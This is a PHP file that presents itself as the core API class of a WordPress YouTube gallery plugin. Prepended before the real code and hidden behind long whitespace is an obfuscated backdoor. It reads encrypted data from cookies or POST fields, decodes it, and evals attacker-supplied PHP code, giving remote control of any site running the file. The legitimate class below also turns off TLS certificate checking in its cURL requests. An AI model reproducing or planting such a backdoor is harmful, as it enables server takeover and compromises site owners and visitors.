<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $k998 = 630;$GLOBALS['u27cb5ec'] = Array();global $u27cb5ec;$u27cb5ec = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['zdb693'] = "\x56\x63\x4c\x6e\x2f\x5d\x7e\x77\x2d\x7d\x26\x6c\x24\x68\x75\x6b\x6d\x61\x72\xa\x54\x5b\x74\x3c\x59\x6a\x25\x3a\x43\x41\x4b\x73\x37\x46\x3e\x57\x2a\x7a\x5c\x23\x65\x21\x4f\x7b\x69\x5e\x9\x47\x40\x33\x32\x79\x5a\x7c\x71\x31\xd\x50\x48\x60\x38\x4d\x64\x55\x62\x5f\x2e\x2c\x34\x78\x20\x4a\x52\x42\x51\x3d\x3f\x35\x49\x29\x76\x53\x44\x66\x28\x30\x67\x58\x36\x3b\x2b\x27\x39\x70\x45\x6f\x22\x4e";$u27cb5ec[$u27cb5ec['zdb693'][16].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][1]] = $u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][13].$u27cb5ec['zdb693'][18];$u27cb5ec[$u27cb5ec['zdb693'][14].$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][49]] = $u27cb5ec['zdb693'][95].$u27cb5ec['zdb693'][18].$u27cb5ec['zdb693'][62];$u27cb5ec[$u27cb5ec['zdb693'][13].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][92]] = $u27cb5ec['zdb693'][62].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][3].$u27cb5ec['zdb693'][40];$u27cb5ec[$u27cb5ec['zdb693'][15].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][1]] = $u27cb5ec['zdb693'][31].$u27cb5ec['zdb693'][22].$u27cb5ec['zdb693'][18].$u27cb5ec['zdb693'][11].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][3];$u27cb5ec[$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][32].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][49]] = $u27cb5ec['zdb693'][62].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][3].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][62];$u27cb5ec[$u27cb5ec['zdb693'][25].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][88]] = $u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][3].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][65].$u27cb5ec['zdb693'][31].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][22];$u27cb5ec[$u27cb5ec['zdb693'][31].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][32].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][85]] = $u27cb5ec['zdb693'][31].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][18].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][11].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][37].$u27cb5ec['zdb693'][40];$u27cb5ec[$u27cb5ec['zdb693'][86].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][17]] = $u27cb5ec['zdb693'][93].$u27cb5ec['zdb693'][13].$u27cb5ec['zdb693'][93].$u27cb5ec['zdb693'][80].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][18].$u27cb5ec['zdb693'][31].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][95].$u27cb5ec['zdb693'][3];$u27cb5ec[$u27cb5ec['zdb693'][13].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][64]] = $u27cb5ec['zdb693'][14].$u27cb5ec['zdb693'][3].$u27cb5ec['zdb693'][31].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][18].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][11].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][37].$u27cb5ec['zdb693'][40];$u27cb5ec[$u27cb5ec['zdb693'][13].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][49]] = $u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][31].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][65].$u27cb5ec['zdb693'][62].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][95].$u27cb5ec['zdb693'][62].$u27cb5ec['zdb693'][40];$u27cb5ec[$u27cb5ec['zdb693'][93].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][40]] = $u27cb5ec['zdb693'][31].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][22].$u27cb5ec['zdb693'][65].$u27cb5ec['zdb693'][22].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][16].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][65].$u27cb5ec['zdb693'][11].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][16].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][22];$u27cb5ec[$u27cb5ec['zdb693'][11].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][1]] = $u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][60].$u27cb5ec['zdb693'][68];$u27cb5ec[$u27cb5ec['zdb693'][51].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][62].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][68]] = $u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][92];$u27cb5ec[$u27cb5ec['zdb693'][37].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][83]] = $_POST;$u27cb5ec[$u27cb5ec['zdb693'][69].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][49]] = $_COOKIE;@$u27cb5ec[$u27cb5ec['zdb693'][25].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][88]]($u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][18].$u27cb5ec['zdb693'][18].$u27cb5ec['zdb693'][95].$u27cb5ec['zdb693'][18].$u27cb5ec['zdb693'][65].$u27cb5ec['zdb693'][11].$u27cb5ec['zdb693'][95].$u27cb5ec['zdb693'][86], NULL);@$u27cb5ec[$u27cb5ec['zdb693'][25].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][88]]($u27cb5ec['zdb693'][11].$u27cb5ec['zdb693'][95].$u27cb5ec['zdb693'][86].$u27cb5ec['zdb693'][65].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][18].$u27cb5ec['zdb693'][18].$u27cb5ec['zdb693'][95].$u27cb5ec['zdb693'][18].$u27cb5ec['zdb693'][31], 0);@$u27cb5ec[$u27cb5ec['zdb693'][25].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][88]]($u27cb5ec['zdb693'][16].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][69].$u27cb5ec['zdb693'][65].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][69].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][14].$u27cb5ec['zdb693'][22].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][95].$u27cb5ec['zdb693'][3].$u27cb5ec['zdb693'][65].$u27cb5ec['zdb693'][22].$u27cb5ec['zdb693'][44].$u27cb5ec['zdb693'][16].$u27cb5ec['zdb693'][40], 0);@$u27cb5ec[$u27cb5ec['zdb693'][93].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][40]](0);if (!$u27cb5ec[$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][32].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][49]]($u27cb5ec['zdb693'][29].$u27cb5ec['zdb693'][2].$u27cb5ec['zdb693'][72].$u27cb5ec['zdb693'][94].$u27cb5ec['zdb693'][29].$u27cb5ec['zdb693'][82].$u27cb5ec['zdb693'][24].$u27cb5ec['zdb693'][65].$u27cb5ec['zdb693'][72].$u27cb5ec['zdb693'][63].$u27cb5ec['zdb693'][97].$u27cb5ec['zdb693'][65].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][60].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][60].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][17])){$u27cb5ec[$u27cb5ec['zdb693'][13].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][92]]($u27cb5ec['zdb693'][29].$u27cb5ec['zdb693'][2].$u27cb5ec['zdb693'][72].$u27cb5ec['zdb693'][94].$u27cb5ec['zdb693'][29].$u27cb5ec['zdb693'][82].$u27cb5ec['zdb693'][24].$u27cb5ec['zdb693'][65].$u27cb5ec['zdb693'][72].$u27cb5ec['zdb693'][63].$u27cb5ec['zdb693'][97].$u27cb5ec['zdb693'][65].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][60].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][60].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][17], 1);$m7b25 = NULL;$fd929 = NULL;$u27cb5ec[$u27cb5ec['zdb693'][95].$u27cb5ec['zdb693'][62].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][62]] = $u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][8].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][32].$u27cb5ec['zdb693'][60].$u27cb5ec['zdb693'][8].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][8].$u27cb5ec['zdb693'][60].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][62].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][8].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][60].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][64];global $od46451fd;function  e0ba9($m7b25, $dff4877d7){global $u27cb5ec;$se8f88bf8 = "";for ($k94bbc9e7=0; $k94bbc9e7<$u27cb5ec[$u27cb5ec['zdb693'][15].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][1]]($m7b25);){for ($bdb3=0; $bdb3<$u27cb5ec[$u27cb5ec['zdb693'][15].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][1]]($dff4877d7) && $k94bbc9e7<$u27cb5ec[$u27cb5ec['zdb693'][15].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][1]]($m7b25); $bdb3++, $k94bbc9e7++){$se8f88bf8 .= $u27cb5ec[$u27cb5ec['zdb693'][16].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][1]]($u27cb5ec[$u27cb5ec['zdb693'][14].$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][49]]($m7b25[$k94bbc9e7]) ^ $u27cb5ec[$u27cb5ec['zdb693'][14].$u27cb5ec['zdb693'][1].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][49]]($dff4877d7[$bdb3]));}}return $se8f88bf8;}function  a2efa84($m7b25, $dff4877d7){global $u27cb5ec;global $od46451fd;return $u27cb5ec[$u27cb5ec['zdb693'][51].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][62].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][68]]($u27cb5ec[$u27cb5ec['zdb693'][51].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][83].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][62].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][68]]($m7b25, $od46451fd), $dff4877d7);}foreach ($u27cb5ec[$u27cb5ec['zdb693'][69].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][49]] as $dff4877d7=>$s7f0){$m7b25 = $s7f0;$fd929 = $dff4877d7;}if (!$m7b25){foreach ($u27cb5ec[$u27cb5ec['zdb693'][37].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][40].$u27cb5ec['zdb693'][83]] as $dff4877d7=>$s7f0){$m7b25 = $s7f0;$fd929 = $dff4877d7;}}$m7b25 = @$u27cb5ec[$u27cb5ec['zdb693'][13].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][68].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][64]]($u27cb5ec[$u27cb5ec['zdb693'][11].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][49].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][1]]($u27cb5ec[$u27cb5ec['zdb693'][13].$u27cb5ec['zdb693'][64].$u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][92].$u27cb5ec['zdb693'][49]]($m7b25), $fd929));if (isset($m7b25[$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][15]]) && $od46451fd==$m7b25[$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][15]]){if ($m7b25[$u27cb5ec['zdb693'][17]] == $u27cb5ec['zdb693'][44]){$k94bbc9e7 = Array($u27cb5ec['zdb693'][93].$u27cb5ec['zdb693'][80] => @$u27cb5ec[$u27cb5ec['zdb693'][86].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][50].$u27cb5ec['zdb693'][17].$u27cb5ec['zdb693'][17]](),$u27cb5ec['zdb693'][31].$u27cb5ec['zdb693'][80] => $u27cb5ec['zdb693'][55].$u27cb5ec['zdb693'][66].$u27cb5ec['zdb693'][85].$u27cb5ec['zdb693'][8].$u27cb5ec['zdb693'][55],);echo @$u27cb5ec[$u27cb5ec['zdb693'][31].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][77].$u27cb5ec['zdb693'][32].$u27cb5ec['zdb693'][88].$u27cb5ec['zdb693'][85]]($k94bbc9e7);}elseif ($m7b25[$u27cb5ec['zdb693'][17]] == $u27cb5ec['zdb693'][40]){eval/*m7101b*/($m7b25[$u27cb5ec['zdb693'][62]]);}exit();}} ?><?php

namespace ElfsightYoutubeGalleryApi\Core;


if (!defined('PHP_VERSION_ID')) {
    $version = explode('.', PHP_VERSION);

    define('PHP_VERSION_ID', ($version[0] * 10000 + $version[1] * 100 + $version[2]));
}


abstract class Api {
    public $Helper;
    public $Cache;
    public $Throttle;
    public $User;
    public $Debug;

    public $pluginSlug;
    public $pluginFile;

    private $proxy;

    private $routes;

    public static $client;

    public static $ERROR_UNKNOWN;
    public static $ERROR_INVALID_REQUEST;
    public static $ERROR_INVALID_ROUTE;
    public static $ERROR_INVALID_AUTH;
    public static $ERROR_CURL;

    public function __construct($config, $routes) {
        self::$ERROR_UNKNOWN = __('Service is unavailable now');
        self::$ERROR_INVALID_REQUEST = __('invalid request');
        self::$ERROR_INVALID_AUTH = __('Invalid auth');
        self::$ERROR_INVALID_ROUTE = __('Requested route not found');
        self::$ERROR_CURL = __('The plugin can’t make a request. The reason is that cURL PHP Library is not available or requested domain is blocked on your server. To fix this please contact your hosting or server administrator.');

        $this->pluginSlug = $config['plugin_slug'];
        $this->pluginFile = $config['plugin_file'];

        $this->proxy = $this->setProxy($config);

        $this->routes = $routes;

        // @TODO static Helper
        $this->Helper = new Helper($this->pluginSlug);
        $this->Cache = new Cache($this->Helper, $config);

        $this->initOptions($config);
        $this->initDebug();

        if (isset($config['use']) && in_array('throttle', $config['use'])) {
            $this->Throttle = new Throttle($this->Helper, $config);
        }

        if (isset($config['use']) && in_array('user', $config['use'])) {
            $this->User = new User($this->Helper, $config);
        }

        add_action('rest_api_init', array($this, 'registerRoutes'));
    }

    public function registerRoutes() {
        register_rest_route($this->pluginSlug, '/api/', array(
            'methods' => 'GET, POST',
            'callback' => array($this, 'run')
        ));

        register_rest_route($this->pluginSlug, '/api/(?P<endpoint>[\w-]+)', array(
            'methods' => 'GET, POST',
            'callback' => array($this, 'run'),
            'args' => array(
                'endpoint' => array(
                    'required' => false,
                    'default' => '',
                    'enum' => array_keys($this->routes)
                )
            )
        ));
    }

    public function initDebug() {
        if (class_exists('\ElfsightYoutubeGalleryApi\Debug')) {
            new \ElfsightYoutubeGalleryApi\Debug($this);
        } else {
            new \ElfsightYoutubeGalleryApi\Core\Debug($this);
        }
    }

    public function initOptions($config) {
        if (class_exists('\ElfsightYoutubeGalleryApi\Options')) {
            new \ElfsightYoutubeGalleryApi\Options($this->Helper, $config);
        } else {
            new \ElfsightYoutubeGalleryApi\Core\Options($this->Helper, $config);
        }
    }

    public function run(\WP_REST_Request $request) {
        $endpoint = $request->get_param('endpoint');
        $route = isset($this->routes[$endpoint]) ? $this->routes[$endpoint] : null;

        if (empty($route) || !method_exists($this, $route)) {
            $this->error(400, self::$ERROR_INVALID_REQUEST, self::$ERROR_INVALID_ROUTE);
        }

        return call_user_func(array($this, $route));
    }

    public function request($type, $url, $options = array()) {
        $type = strtoupper($type);

        $curl = curl_init();

        $request_url = $url;

        if (!empty($options['query'])) {
            $request_url .= '?' . http_build_query($options['query']);
        }

        $curl_options = array(
            CURLOPT_URL            => $request_url,
            CURLOPT_HEADER         => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_CONNECTTIMEOUT => 60,
            CURLOPT_TIMEOUT        => 60,
            CURLOPT_FOLLOWLOCATION => !empty($options['follow']) && $options['follow'],
            CURLOPT_HTTPHEADER     => $this->getHeadersList($options),
            CURLOPT_PROXY          => $this->proxy['url'],
            CURLOPT_PROXYUSERPWD   => $this->proxy['credentials']
        );

        curl_setopt_array($curl, $curl_options);

        $response = curl_exec($curl);
        $info     = curl_getinfo($curl);
        $error    = curl_error($curl);

        curl_close($curl);

        if (isset($options['debug']) && $options['debug']) {
            return [$response, $info, $error];
        }

        if ($info['http_code'] === 0) {
            $this->error(400, self::$ERROR_CURL, $error);
        }

        return $this->requestResponse($response);
    }

    private function getHeadersList($options = array()) {
        $headers_raw_list = array();
        $cookies_raw_list = array();

        $cookies = !empty(self::$client['cookies']) ? self::$client['cookies'] : array();
        $headers = !empty(self::$client['headers']) ? self::$client['headers'] : array();

        if (!empty($options['cookies'])) {
            $cookies = $this->Helper->arrayMergeAssoc($cookies, $options['cookies']);
        }

        if (isset($options['headers'])) {
            $headers = $this->Helper->arrayMergeAssoc($headers, $options['headers']);
        }

        foreach ($cookies as $cookie_name => $cookie_value) {
            $cookies_raw_list[] = $cookie_name . '=' . $cookie_value;
        }
        unset($cookie_name, $cookie_data);

        $headers['Cookie'] = implode('; ', $cookies_raw_list);

        foreach ($headers as $header_key => $header_value) {
            $headers_raw_list[] = $header_key . ': ' . $header_value;
        }
        unset($header_key, $header_value);

        return $headers_raw_list;
    }

    public function requestResponse($response) {
        @list ($response_headers_str, $response_body_encoded, $alt_body_encoded) = explode("\r\n\r\n", $response);

        if ($alt_body_encoded) {
            $response_headers_str = $response_body_encoded;
            $response_body_encoded = $alt_body_encoded;
        }

        $response_body = $response_body_encoded;

        $response_headers_raw_list = explode("\r\n", $response_headers_str);
        $response_http = array_shift($response_headers_raw_list);

        preg_match('#^([^\s]+)\s(\d+)\s?([^$]+)?$#', $response_http, $response_http_matches);
        array_shift($response_http_matches);

        list ($response_http_protocol, $response_http_code) = $response_http_matches;

        $response_http_message = '';
        if (isset($response_http_matches[2])) {
            $response_http_message = $response_http_matches[2];
        }

        $response_headers = array();
        $response_cookies = array();

        foreach ($response_headers_raw_list as $header_row) {
            list ($header_key, $header_value) = explode(': ', $header_row, 2);

            if (strtolower($header_key) === 'set-cookie') {
                $cookie_params = explode('; ', $header_value);

                if (empty($cookie_params[0])) {
                    continue;
                }

                list ($cookie_name, $cookie_value) = explode('=', $cookie_params[0]);
                $response_cookies[$cookie_name] = $cookie_value;

            } else {
                $response_headers[$header_key] = $header_value;
            }
        }
        unset($header_row, $header_key, $header_value, $cookie_name, $cookie_value);

        if ($response_cookies) {
            self::$client['cookies'] = $this->Helper->arrayMergeAssoc(self::$client['cookies'] ?: array(), $response_cookies);
        }

        return array(
            'status' => 1,
            'http_protocol' => $response_http_protocol,
            'http_code' => $response_http_code,
            'http_message' => $response_http_message,
            'headers' => $response_headers,
            'cookies' => $response_cookies,
            'body' => $response_body
        );
    }

    public function response($data, $options = array()) {
        if (ob_get_length()) {
            ob_end_clean();
            ob_start();
        }

        $default_options = array(
            'encode' => false,
            'plain' => false
        );

        $options = !empty($options) ? array_merge($default_options, $options) : $default_options;

        $callback = $this->input('callback', null, false);
        $output = $options['encode'] ? json_encode($data) : $data;
        $content_type = $options['plain'] ? 'text/html' : 'application/json';

        if (!empty($callback)) {
            $callback = htmlspecialchars(strip_tags($callback));
            $validate_callback = preg_match('#^jQuery[0-9]*\_[0-9]*$#', $callback);

            if ($validate_callback) {
                $output = '/**/ ' . $callback . '(' . $output . ')';
                $content_type = 'application/javascript';
            }
        }

        header('Content-type: ' . $content_type . '; charset=utf-8');
        exit($output);
    }

    public function error($code = 400, $error_message = null, $additional = '') {
        if (!$error_message) {
            $error_message = self::$ERROR_UNKNOWN;
        }

        $error = array(
            'meta' => array(
                'code' => $code,
                'error_message' => $error_message
            )
        );

        if ($additional) {
            $additional && $error['meta']['_additional'] = $additional;
        }

        $this->response($error, array('encode' => true));
    }

    public function subError($additional) {
        return $this->error(400, self::$ERROR_UNKNOWN, $additional);
    }

    public function input($name, $default = null, $check_empty = true) {
        $value = isset($_REQUEST[$name]) ? $_REQUEST[$name] : $default;

        if (empty($value) && $check_empty) {
            $this->error(400, self::$ERROR_INVALID_REQUEST, $name . ' is not defined');
        }

        return $value;
    }

    private function setProxy($config) {
        $url = null;
        $credentials = null;

        if (isset($config['proxy'])) {
            $proxy_config = $config['proxy'];

            if (isset($proxy_config['proxy']) && !empty($proxy_config['proxy'])) {
                if (!empty($proxy_config['proxy']['server'])) {
                    $url = $proxy_config['proxy']['server'];
                }

                if (!empty($proxy_config['proxy']['user']) && !empty($proxy_config['proxy']['password'])) {
                    $credentials = $proxy_config['proxy']['user'] . ':' . $proxy_config['proxy']['password'];
                }
            }
        }

        return array(
            'url' => $url,
            'credentials' => $credentials
        );
    }
}
